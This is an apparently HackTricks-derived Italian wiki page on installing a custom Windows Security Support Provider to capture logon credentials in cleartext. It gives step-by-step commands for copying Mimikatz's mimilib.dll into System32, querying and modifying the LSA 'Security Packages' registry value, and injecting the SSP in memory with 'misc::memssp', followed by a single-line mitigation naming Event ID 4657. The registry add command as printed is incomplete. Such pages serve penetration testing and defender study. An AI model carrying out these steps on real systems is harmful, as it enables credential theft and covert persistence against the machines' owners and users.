# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Scopri qui cos'è un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il **tuo SSP** per **catturare** in **testo in chiaro** le **credenziali** utilizzate per accedere alla macchina.

#### Mimilib

Puoi utilizzare il binario `mimilib.dll` fornito da Mimikatz. **Questo registrerà in un file tutte le credenziali in testo in chiaro.**\
Copia la DLL in `C:\Windows\System32\`\
Ottieni un elenco dei pacchetti di sicurezza LSA esistenti:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Aggiungi `mimilib.dll` all'elenco dei Security Support Provider (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
E dopo un riavvio, tutte le credenziali possono essere trovate in testo in chiaro in `C:\Windows\System32\kiwissp.log`

#### In memoria

Puoi anche iniettarlo direttamente in memoria usando Mimikatz (nota che potrebbe essere leggermente instabile/non funzionare):
```bash
privilege::debug
misc::memssp
```
Questo non sopravviverà ai riavvii.

#### Mitigazione

Event ID 4657 - Audit della creazione/modifica di `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
